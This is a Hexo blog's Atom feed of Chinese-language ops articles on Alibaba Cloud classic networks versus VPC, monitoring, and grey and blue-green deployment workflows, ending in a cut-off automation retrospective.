<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chengyang&#39;s Blog</title>
  <subtitle>The mountain road twists and turns, but after all, toward the peak extension.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.yangcvo.me/"/>
  <updated>2017-04-19T06:50:50.000Z</updated>
  <id>http://blog.yangcvo.me/</id>
  
  <author>
    <name>yangc</name>
    <email>yangcvo@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>深度了解阿里云服务器经典网络和专有网络区别如何实现方案？</title>
    <link href="http://blog.yangcvo.me/2017/04/10/%E7%BD%91%E7%BB%9C/%E6%B7%B1%E5%BA%A6%E4%BA%86%E8%A7%A3%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E5%92%8C%E4%B8%93%E6%9C%89%E7%BD%91%E7%BB%9C%E5%8C%BA%E5%88%AB%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88%EF%BC%9F/"/>
    <id>http://blog.yangcvo.me/2017/04/10/网络/深度了解阿里云服务器经典网络和专有网络区别如何实现方案？/</id>
    <published>2017-04-10T09:56:03.000Z</published>
    <updated>2017-04-19T06:50:50.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;深度了解阿里云服务器经典网络和专有网络区别？：&quot;&gt;&lt;a href=&quot;#深度了解阿里云服务器经典网络和专有网络区别？：&quot; class=&quot;headerlink&quot; title=&quot;深度了解阿里云服务器经典网络和专有网络区别？：&quot;&gt;&lt;/a&gt;深度了解阿里云服务器经典网络和专有网络区别？：&lt;/h3&gt;&lt;p&gt;   公司一开始购买阿里云服务器全部选择经典网络，机器现在数量较多，现在考虑到安全问题和管理上问题，所以公司决定在网络上管理自主控制从经典网络上迁移到专有网络，在这个过程我也了解了这两者的区别记录写下来，后面再讲如何实现迁移的过程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在用户提交订单购买阿里云ECS云服务器时，会面临怎样选择网络类型的烦恼，阿里云服务器定制购买时，网络类型里的经典网络和专有网络（VPC）是什么含义，该怎样选择适合自己的网络类型呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其实，阿里云官网已经给出了关于这两种网络的简单介绍：&lt;/p&gt;
&lt;p&gt;网络类型：仅是 ECS 产品功能上区分，与运营商公网接入网络质量无关，任何网络类型的运营商接入均为 BGP 线路，请您放心使用，并根据自己需要进行选择。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;经典网络： IP地址由阿里云统一分配，配置简便，使用方便，适合对操作易用性要求比较高、需要快速使用 ECS 的用户。&lt;/li&gt;
&lt;li&gt;专有网络： 是指逻辑隔离的私有网络，您可以自定义网络拓扑和 IP 地址，支持通过专线连接。适合于熟悉网络管理的用户。 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;只不过，这个介绍对于很多人来讲，还是看的云里雾里，看完了也不知道该怎么选。&lt;/p&gt;
&lt;p&gt;其实，可以这样简单地理解，从公网ip来讲，经典网络和专有网络没有区别；&lt;br&gt;从内网ip来讲，经典网络是DHIP，也就是自动分配局域网ip地址，而专有网络则是手工分配局域网ip地址，这样方便有多台云服务器的用户自行定义内网ip结构。所以，如果用户只有一台服务器，或者有多台服务器但不需要进行内网互联，那么这两种网络都可以选择的。&lt;/p&gt;
&lt;p&gt;但从实务上讲，因为经典网络是阿里云自动分配的ip地址，有一定的规律性，那么黑客也就可以利用内网ip进行局域网攻击，虽然在阿里云的安全体系下有些难度，但事实也证明了有被攻击的可能性。而专有网络因为是自定义局域网ip，那么黑客就没那么容易进入用户的内网进行攻击了。&lt;/p&gt;
&lt;h3 id=&quot;那么为什么要有VPC呢：&quot;&gt;&lt;a href=&quot;#那么为什么要有VPC呢：&quot; class=&quot;headerlink&quot; title=&quot;那么为什么要有VPC呢：&quot;&gt;&lt;/a&gt;那么为什么要有VPC呢：&lt;/h3&gt;&lt;p&gt;在vpc之前的网络类型就叫经典网络，VPC的主要作用为了解决用户在&lt;code&gt;云端的安全隔离&lt;/code&gt;问题。&lt;/p&gt;
&lt;p&gt;举个例子，我建在专有网络里的家，其他人到我家默认是没有路的。而建在经典网络里的家，其他人到我家是有路的，只不过路上被很多荆棘挡住了，所以经典网络存在被攻击的可能性。当然VPC还有很多其他好处，比如网络管理更灵活。&lt;/p&gt;
&lt;p&gt;专有网络天生是&lt;code&gt;隔离的安全网络&lt;/code&gt;，默认情况下，别人不能通过&lt;code&gt;私网访问用户VPC&lt;/code&gt;，用户的VPC也不能通过私网访问别人。这里的别人包括：其他VPC和经典网络。&lt;/p&gt;
&lt;p&gt;前面介绍到专有网络适合精通网络管理的用户，定制型可扩展型更强，那么用户利用VPC可以做些什么呢？&lt;/p&gt;
&lt;h5 id=&quot;IP自主选择&quot;&gt;&lt;a href=&quot;#IP自主选择&quot; class=&quot;headerlink&quot; title=&quot;IP自主选择&quot;&gt;&lt;/a&gt;IP自主选择&lt;/h5&gt;&lt;p&gt;目前，阿里云VPC提供的IP地址有&lt;code&gt;192.168.0.0/16，172.16.0.0/12和10.0.0.0/8&lt;/code&gt;。用户可以选择一段IP地址来识别云产品，同时可以把IP地址拆分成很多子网给不同的应用使用，能够做到很好的网络管理。&lt;/p&gt;
&lt;h5 id=&quot;安全自主可控&quot;&gt;&lt;a href=&quot;#安全自主可控&quot; class=&quot;headerlink&quot; title=&quot;安全自主可控&quot;&gt;&lt;/a&gt;安全自主可控&lt;/h5&gt;&lt;p&gt;专有网络里没经过授权任何外部访问都是被禁止的网络内的成员（如ECS）默认也不能随便访问公网或者其他专有网络。成员之间（如ECS）默认可以通信，但管理员也可以对成员的通信进行管制（通过安全组）。&lt;/p&gt;
&lt;p&gt;实现路由的自定义规则&lt;br&gt;实现VPC内的路由控制&lt;/p&gt;
&lt;h5 id=&quot;双可用区（机房）冗余备份&quot;&gt;&lt;a href=&quot;#双可用区（机房）冗余备份&quot; class=&quot;headerlink&quot; title=&quot;双可用区（机房）冗余备份&quot;&gt;&lt;/a&gt;双可用区（机房）冗余备份&lt;/h5&gt;&lt;p&gt;把云产品放置在不同的可用区，这样万一一个可用区（机房）出现问题，另外一个可用区（机房）还可以继续服务。&lt;/p&gt;
&lt;h5 id=&quot;实现多个云上多个VPC之间的访问&quot;&gt;&lt;a href=&quot;#实现多个云上多个VPC之间的访问&quot; class=&quot;headerlink&quot; title=&quot;实现多个云上多个VPC之间的访问&quot;&gt;&lt;/a&gt;实现多个云上多个VPC之间的访问&lt;/h5&gt;&lt;p&gt;为了安全，用户要将测试业务和生产业务分开，因此可以在云上建立两个VPC，A VPC 负责生产业务，B VPC负责测试业务，两个PVC之间默认不能通信。如果A VPC 负责生产业务，优先级高，需要经常访问B VPC，但反之则不行，这个时候就需要使用高速通道把A VPC 单向连到B VPC 就可以了。&lt;/p&gt;
&lt;h5 id=&quot;实现云上VPC和云下IDC&quot;&gt;&lt;a href=&quot;#实现云上VPC和云下IDC&quot; class=&quot;headerlink&quot; title=&quot;实现云上VPC和云下IDC&quot;&gt;&lt;/a&gt;实现云上VPC和云下IDC&lt;/h5&gt;&lt;p&gt;除了云上VPC，用户在云下自己的机房还有很多服务器，也可以使用高速通道把云上VPC和云下机房连起来。这就是现在流行的混合云。&lt;/p&gt;
&lt;h3 id=&quot;小结&quot;&gt;&lt;a href=&quot;#小结&quot; class=&quot;headerlink&quot; title=&quot;小结&quot;&gt;&lt;/a&gt;小结&lt;/h3&gt;&lt;p&gt;所以，如果您就只有一台服务器，或者多台服务器之间不需要内网互联，那么怎样选择都可以，个人建议选择专有网络，后期管理更为简单。&lt;br&gt;有内网互联需求，不需要自定义网络结构，也可以选择经典网络。&lt;/p&gt;
&lt;p&gt;我们优先推荐客户使用VPC网络环境来部署应用系统，VPC下的网络环境会更灵活，安全更加有保证。&lt;/p&gt;
&lt;h3 id=&quot;实现方案&quot;&gt;&lt;a href=&quot;#实现方案&quot; class=&quot;headerlink&quot; title=&quot;实现方案&quot;&gt;&lt;/a&gt;实现方案&lt;/h3&gt;&lt;p&gt;基础流程第一步：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在阿里云产品服务-专有网络VPC申请开通-在专有网络VPC上面选择专有网络-创建专有网络。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;创建选择自己规定下一个网段，提供的IP地址有&lt;code&gt;192.168.0.0/16，172.16.0.0/12和10.0.0.0/8&lt;/code&gt;  这里我选择192.168.0.0/16 创建完成点击管理。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;专有网络-管理-查看路由器可以看到帮你生成出来两个路由器表，分别网段：192.168.1.0/24 100.64.0.0/10显示可用。&lt;br&gt;专有网络-管理-查看交换机-选择创建交换机-填写交换机名称（hd_Switch_01）-选择地区-选择网段就可以了,这里显示252私有IP地址可用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;专有网络-管理-交换机-点击操作创建实例-分别有：创建ECS实例,创建RDS实例,创建SLB实例。-这里会自动跳转到自动义-选择地域-选择专有网络-选择对应的路由器ID和交换机ID。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实施方案图晚点更新画出。&lt;/p&gt;
&lt;p&gt;架构解读：您可以在阿里云上创建一个专有网络，和其他租户的网络完全隔离。您可以完全掌控自己的虚拟网络，例如选择自己的 IP 地址范围、划分网段、配置路由表和网关等，从而实现安全而轻松的资源访问和应用程序访问。此外，您也可以通过专线或 VPN 等连接方式将您的专有网络与传统数据中心相连，形成一个按需定制的网络环境，实现应用的平滑迁移上云和对数据中心的扩展,使用VPC、RDS、ECS搭建云上业务系统，核心数据放置在云下自建数据中心，使用高速通道专线接入保证云上数据快速同步，实现云上云下数据互通，搭建一个混合云使用环境。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;深度了解阿里云服务器经典网络和专有网络区别？：&quot;&gt;&lt;a href=&quot;#深度了解阿里云服务器经典网络和专有网络区别？：&quot; class=&quot;headerlink&quot; title=&quot;深度了解阿里云服务器经典网络和专有网络区别？：&quot;&gt;&lt;/a&gt;深度了解阿里云服务器经典网络和专有
    
    </summary>
    
      <category term="NetWork" scheme="http://blog.yangcvo.me/categories/NetWork/"/>
    
    
      <category term="NetWork" scheme="http://blog.yangcvo.me/tags/NetWork/"/>
    
  </entry>
  
  <entry>
    <title>【翻译】监控不只是为了处理故障</title>
    <link href="http://blog.yangcvo.me/2017/04/05/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E7%9B%91%E6%8E%A7%E4%B8%8D%E5%8F%AA%E6%98%AF%E4%B8%BA%E4%BA%86%E5%A4%84%E7%90%86%E6%95%85%E9%9A%9C/"/>
    <id>http://blog.yangcvo.me/2017/04/05/运维笔记/【翻译】监控不只是为了处理故障/</id>
    <published>2017-04-05T03:33:17.000Z</published>
    <updated>2017-04-17T10:16:56.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;【翻译】监控不只是为了处理故障&quot;&gt;&lt;a href=&quot;#【翻译】监控不只是为了处理故障&quot; class=&quot;headerlink&quot; title=&quot;【翻译】监控不只是为了处理故障&quot;&gt;&lt;/a&gt;【翻译】监控不只是为了处理故障&lt;/h3&gt;&lt;p&gt;有一种普遍的想法认为监控只是在系统出错的时候能够发出报警，我们一直相信，监控系统的方方面面给予我们洞察业务内部机制的能力，并驱动我们做出决策。&lt;br&gt;不同的人有不同的监控方式，手动查看日志，接受报警或者24x7值守查看各种图表。不管你用那种方式，最重要的是及时收到报错和警告。&lt;br&gt;但是监控其实能做的更多。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Prometheus-Overview.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;监控不止用于故障时候发报警&lt;/p&gt;
&lt;p&gt;监控系统不应该只是告诉你“这有一个问题”，它也要帮助你排查问题出现的原因,你不只是想在服务变慢的时候收到报警，你其实想知道过去几小时流量是否增加了，机器是不是宕机了，后端服务器是不是变慢了或者内部执行时间变长了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Prometheus-Overview-1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;在你的应用中集成监控模块&lt;/p&gt;
&lt;p&gt;做为报警和排错重要手段，监控要在你的架构体系中拥有核心位置。要集成监控工具在你的所有代码逻辑中，而不仅仅是在边缘区域添加一点。跟踪每个请求提交api需要多少组件，以便你在设计新的存储系统是否能够知道要处理多少数据，跟踪内存的命中率，以便你能度量它们随着流量模式变化的规律，甚至分解到memcached中来节省内存和提高命中率。跟踪用户命中你的业务逻辑的”慢路径“，以便你知道它什么时候可以更快，并且当新的功能使用”慢路径“的时候，你已经准备好了让它”延迟命中“。&lt;br&gt;在你的代码内部，做这样大量的细节工作，可以让你前进的更快，技术和产品决策会受益良多，根本上提升了你的效率。这就是监控的意义所在，监控不只是为了处理故障。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;原文 &lt;a href=&quot;https://www.robustperception.io/monitoring-not-just-for-outages/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.robustperception.io/monitoring-not-just-for-outages/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【翻译】监控不只是为了处理故障&quot;&gt;&lt;a href=&quot;#【翻译】监控不只是为了处理故障&quot; class=&quot;headerlink&quot; title=&quot;【翻译】监控不只是为了处理故障&quot;&gt;&lt;/a&gt;【翻译】监控不只是为了处理故障&lt;/h3&gt;&lt;p&gt;有一种普遍的想法认为监控只是在系统出
    
    </summary>
    
      <category term="运维笔记" scheme="http://blog.yangcvo.me/categories/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Performance monitoring" scheme="http://blog.yangcvo.me/tags/Performance-monitoring/"/>
    
  </entry>
  
  <entry>
    <title>APP自动化部署:开发部署-测试部署-灰度发布/蓝绿部署-生产环境等部署流程方案总结</title>
    <link href="http://blog.yangcvo.me/2017/03/15/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/APP%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2:%E5%BC%80%E5%8F%91%E9%83%A8%E7%BD%B2-%E6%B5%8B%E8%AF%95%E9%83%A8%E7%BD%B2-%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83:%E8%93%9D%E7%BB%BF%E9%83%A8%E7%BD%B2-%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%AD%89%E9%83%A8%E7%BD%B2%E6%B5%81%E7%A8%8B%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.yangcvo.me/2017/03/15/运维笔记/APP自动化部署:开发部署-测试部署-灰度发布:蓝绿部署-生产环境等部署流程方案总结/</id>
    <published>2017-03-15T03:33:17.000Z</published>
    <updated>2017-04-13T07:22:56.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;APP自动化部署：开发部署、测试部署、灰度发布等部署方案对比与总结&quot;&gt;&lt;a href=&quot;#APP自动化部署：开发部署、测试部署、灰度发布等部署方案对比与总结&quot; class=&quot;headerlink&quot; title=&quot;APP自动化部署：开发部署、测试部署、灰度发布等部署方案对比与总结&quot;&gt;&lt;/a&gt;APP自动化部署：开发部署、测试部署、灰度发布等部署方案对比与总结&lt;/h1&gt;&lt;h4 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h4&gt;&lt;p&gt;个人现在在一个医疗行业公司：美年大这边负责体检APP的运维相关工作，今天主要是整理了下现在团队APP发布流程&lt;br&gt;方案：&lt;/p&gt;
&lt;p&gt;因为在项目迭代的过程中，不可避免需要”上线”。上线对应着部署，或者重新部署；部署对应着修改；修改则意味着风险。&lt;br&gt;目前有很多用于部署的技术，有的简单，有的复杂；有的得停机，有的不需要停机即可完成部署。&lt;/p&gt;
&lt;p&gt;个人整理下部署流程说明其实现在很多部署方法，现在我们用目前比较流行的几种部署方案，或者说策略方案对比总结简单讨论一下目前比较流行的几种部署方案，或者说策略。如有不足之处请指出，如有谬误，请指正^_^。&lt;/p&gt;
&lt;p&gt;我们有自己开发环境和测试环境 ：&lt;/p&gt;
&lt;h4 id=&quot;开发环境部署：&quot;&gt;&lt;a href=&quot;#开发环境部署：&quot; class=&quot;headerlink&quot; title=&quot;开发环境部署：&quot;&gt;&lt;/a&gt;开发环境部署：&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;问题：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;开发人员每个人在自己电脑环境写代码自己电脑本机测试代码是否run成功，每个开发人员都在自己本地写完测试出现问题是各自环境不统一导致遇到坑阻碍到测试人员测试，基础的bug也会浪费太多时间。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;解决后：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要是解决了给予开发团队在写代码或者修改bug可以第一时间更新部署。大家统一一个开发环境这个是为了在开发阶段能立马呈现效果。&lt;/p&gt;
&lt;h4 id=&quot;测试环境部署：&quot;&gt;&lt;a href=&quot;#测试环境部署：&quot; class=&quot;headerlink&quot; title=&quot;测试环境部署：&quot;&gt;&lt;/a&gt;测试环境部署：&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;问题：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一开始没有测试环境，直接开发环境当作测试环境去跑，发现很多问题，就是测试环境数据跟生产不一样，导致很多bug问题，测试发现测试的时候，开发在更新代码发布，耽误了测试人员的测试过程，环境不能独立都互相占用，刀子效率没有提高，bug每个星期都不断提升。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;解决后：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要解决了开发环境和测试环境独立，不会互相影响，测试人员有单独环境去测试生产能准确的数据对比。&lt;/p&gt;
&lt;h4 id=&quot;选择灰度环境部署方案：&quot;&gt;&lt;a href=&quot;#选择灰度环境部署方案：&quot; class=&quot;headerlink&quot; title=&quot;选择灰度环境部署方案：&quot;&gt;&lt;/a&gt;选择灰度环境部署方案：&lt;/h4&gt;&lt;p&gt;先贴个百度百科：&lt;/p&gt;
&lt;p&gt;灰度发布是指在黑与白之间，能够平滑过渡的一种发布方式。AB test就是一种灰度发布方式，让一部分用户继续用A，一部分用户开始用B，如果用户对B没有什么反对意见，那么逐步扩大范围，把所有用户都迁移到B上面来。灰度发布可以保证整体系统的稳定，在初始灰度的时候就可以发现、调整问题，以保证其影响度。&lt;/p&gt;
&lt;p&gt;灰度环境部署:&lt;/p&gt;
&lt;p&gt;个人理解灰度部署是增量发布的一种类型，它的执行方式是在原有软件生产版本可用的情况下，同时部署一个新的版本。同时运行同一个软件产品的多个版本需要软件针对配置和完美自动化部署进行特别设计。&lt;/p&gt;
&lt;figure class=&quot;highlight gcode&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(1)&lt;/span&gt; 准备好部署各个阶段的工件，包括：构建工件，测试脚本，配置文件和部署清单文件。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(2)&lt;/span&gt; 从负载均衡列表中移除掉“部署灰度环境”服务器。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(3)&lt;/span&gt; 升级“灰度部署”应用（排掉原有流量并进行部署）。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(4)&lt;/span&gt; 对应用进行自动化测试。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(5)&lt;/span&gt; 将“灰度环境”服务器重新添加到负载均衡列表中（连通性和健康检查）。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(6)&lt;/span&gt; 如果“灰度环境”在线使用测试成功，升级剩余的其他服务器。（否则就回滚）&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;灰度发布中，常常按照用户设置路由权重，例如&lt;span class=&quot;number&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;meta&quot;&gt;%&lt;/span&gt;的用户维持使用老版本，&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;meta&quot;&gt;%&lt;/span&gt;的用户尝鲜新版本。不同版本应用共存，经常与A/B测试一起使用，用于测试选择多种方案。灰度发布比较典型的例子&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第1步: 把绿色集群的状态改为’备用’. 从负载均衡的池里把这些地址去掉,这样,绿色的集群就不再回接收到来自用户的请求了.转而进入备用负载均衡的池里.&lt;/p&gt;
&lt;h3 id=&quot;选择蓝绿环境部署方案：&quot;&gt;&lt;a href=&quot;#选择蓝绿环境部署方案：&quot; class=&quot;headerlink&quot; title=&quot;选择蓝绿环境部署方案：&quot;&gt;&lt;/a&gt;选择蓝绿环境部署方案：&lt;/h3&gt;&lt;h5 id=&quot;蓝绿发布的意义&quot;&gt;&lt;a href=&quot;#蓝绿发布的意义&quot; class=&quot;headerlink&quot; title=&quot;蓝绿发布的意义&quot;&gt;&lt;/a&gt;蓝绿发布的意义&lt;/h5&gt;&lt;p&gt;整个发布过程，用户没有感受到任何宕机或者服务重启。&lt;/p&gt;
&lt;h5 id=&quot;蓝绿发布的过程&quot;&gt;&lt;a href=&quot;#蓝绿发布的过程&quot; class=&quot;headerlink&quot; title=&quot;蓝绿发布的过程&quot;&gt;&lt;/a&gt;蓝绿发布的过程&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;第0步:部署以前的配置&lt;br&gt;&lt;img src=&quot;http://1.bp.blogspot.com/-K8gbbN7S_xo/UmbijDyvS4I/AAAAAAAAE5M/3DCOJRrrbIY/s1600/Blue+Green+Deployment+for+Zero+Downtime+(8&quot; alt=&quot;&quot;&gt;.png)&lt;/li&gt;
&lt;li&gt;第1步: 把绿色集群的状态改为’备用’. 从负载均衡的池里把这些地址去掉,这样,绿色的集群就不再回接收到来自用户的请求了.转而进入备用负载均衡的池里.&lt;br&gt;&lt;img src=&quot;http://1.bp.blogspot.com/-nITj_nPp5IY/UmbiuMblJNI/AAAAAAAAE5U/ovn4sSMcFco/s1600/Blue+Green+Deployment+for+Zero+Downtime+(9&quot; alt=&quot;&quot;&gt;.png)&lt;/li&gt;
&lt;li&gt;第2步:在绿色集群里部署新的代码,直到应用启动成功&lt;br&gt;&lt;img src=&quot;http://3.bp.blogspot.com/-2F2dB-vux4g/UmbheBwtcAI/AAAAAAAAE5E/1l9il1igplQ/s1600/Blue+Green+Deployment+for+Zero+Downtime+(4&quot; alt=&quot;&quot;&gt;.png)&lt;/li&gt;
&lt;li&gt;第3步:使用备用负载均衡简单测试一下备用集群的部署情况.理想状态下是全自动的.&lt;/li&gt;
&lt;li&gt;第4步:把绿色备用集群的状态改成存货,于是进入了存活负载均衡的池里&lt;br&gt;&lt;img src=&quot;http://3.bp.blogspot.com/-2F2dB-vux4g/UmbheBwtcAI/AAAAAAAAE5E/1l9il1igplQ/s1600/Blue+Green+Deployment+for+Zero+Downtime+(4&quot; alt=&quot;&quot;&gt;.png)&lt;br&gt;看到 蓝色运行v1版本,绿色运行v2版本,都连接的是相同的数据库.这意味着v2版本也要在老的数据模型上运行.如果数据库有变更,要等到所有的集群升级到新的代码上.&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第5步: 对蓝色集群也进行同样的操作.&lt;br&gt;&lt;img src=&quot;http://4.bp.blogspot.com/-aTz1EdP6pb0/UmbjAx46vrI/AAAAAAAAE5c/qqxolMnae44/s640/Blue+Green+Deployment+for+Zero+Downtime+(5&quot; alt=&quot;&quot;&gt;.png)&lt;br&gt;&lt;img src=&quot;http://3.bp.blogspot.com/-95YNOBeYoUU/UmbjFq711dI/AAAAAAAAE5k/Q5Naa80xk64/s640/Blue+Green+Deployment+for+Zero+Downtime+(6&quot; alt=&quot;&quot;&gt;.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;最终v2代码完成部署.&lt;br&gt;&lt;img src=&quot;http://2.bp.blogspot.com/-eh1gR1sBPNc/UmbjMkDCixI/AAAAAAAAE5s/vJOeYjV03vI/s640/Blue+Green+Deployment+for+Zero+Downtime+(7&quot; alt=&quot;&quot;&gt;.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第6步:根据情况.运行数据库迁移&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：tks   &lt;a href=&quot;http://sunitspace.blogspot.jp/2013/10/blue-green-deployment.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;green-deployment&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;总结：&quot;&gt;&lt;a href=&quot;#总结：&quot; class=&quot;headerlink&quot; title=&quot;总结：&quot;&gt;&lt;/a&gt;总结：&lt;/h3&gt;&lt;p&gt;1) 蓝绿部署：不停止老版本，额外搞一套新版本，等测试发现新版本OK后，删除老版本。其实这里删除老版本也就是重新部署了老版本成为新版本一起放上去，等需要更新发布迁下期中一个版本环境部署：现在我们公司使用蓝绿部署方案。&lt;/p&gt;
&lt;p&gt;3) 灰度发布：不停止老版本，额外搞一套新版本，常常按照用户设置路由权重，例如90%的用户维持使用老版本，10%的用户尝鲜新版本。不同版本应用共存，经常与A/B测试一起使用，用于测试选择多种方案。&lt;/p&gt;
&lt;h3 id=&quot;其实两种含义个人认为相差不是特别大，都特别适合现在发布部署流程方案。&quot;&gt;&lt;a href=&quot;#其实两种含义个人认为相差不是特别大，都特别适合现在发布部署流程方案。&quot; class=&quot;headerlink&quot; title=&quot;其实两种含义个人认为相差不是特别大，都特别适合现在发布部署流程方案。&quot;&gt;&lt;/a&gt;其实两种含义个人认为相差不是特别大，都特别适合现在发布部署流程方案。&lt;/h3&gt;</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;APP自动化部署：开发部署、测试部署、灰度发布等部署方案对比与总结&quot;&gt;&lt;a href=&quot;#APP自动化部署：开发部署、测试部署、灰度发布等部署方案对比与总结&quot; class=&quot;headerlink&quot; title=&quot;APP自动化部署：开发部署、测试部署、灰度发布等部署
    
    </summary>
    
      <category term="运维笔记" scheme="http://blog.yangcvo.me/categories/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Automation Deploy" scheme="http://blog.yangcvo.me/tags/Automation-Deploy/"/>
    
  </entry>
  
  <entry>
    <title>运维自动化总结-记录帮助公司自动化架构演变过程</title>
    <link href="http://blog.yangcvo.me/2017/03/14/%E8%87%AA%E5%8A%A8%E5%8C%96+%E5%8F%AF%E8%A7%86%E5%8C%96/%E8%BF%90%E7%BB%B4%E8%87%AA%E5%8A%A8%E5%8C%96/%E8%BF%90%E7%BB%B4%E8%87%AA%E5%8A%A8%E5%8C%96%E6%80%BB%E7%BB%93-%E8%AE%B0%E5%BD%95%E5%B8%AE%E5%8A%A9%E5%85%AC%E5%8F%B8%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%B6%E6%9E%84%E6%BC%94%E5%8F%98%E8%BF%87%E7%A8%8B/"/>
    <id>http://blog.yangcvo.me/2017/03/14/自动化+可视化/运维自动化/运维自动化总结-记录帮助公司自动化架构演变过程/</id>
    <published>2017-03-14T03:34:17.000Z</published>
    <updated>2017-03-28T11:09:04.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;运维自动化个人总结-记录自己自动化运维技术提升👍&quot;&gt;&lt;a href=&quot;#运维自动化个人总结-记录自己自动化运维技术提升👍&quot; class=&quot;headerlink&quot; title=&quot;运维自动化个人总结-记录自己自动化运维技术提升👍&quot;&gt;&lt;/a&gt;运维自动化个人总结-记录自己自动化运维技术提升👍&lt;/h3&gt;&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;个人2014年开始玩自动化的也是刚从业&lt;code&gt;自动化运维&lt;/code&gt;岗位第一份工作，在一家上市公司做&lt;code&gt;IDC+APM+CDN&lt;/code&gt;做云加速的应该很多玩cdn的都听说这家公司－&lt;code&gt;mmtrix.com&lt;/code&gt;。&lt;/p&gt;
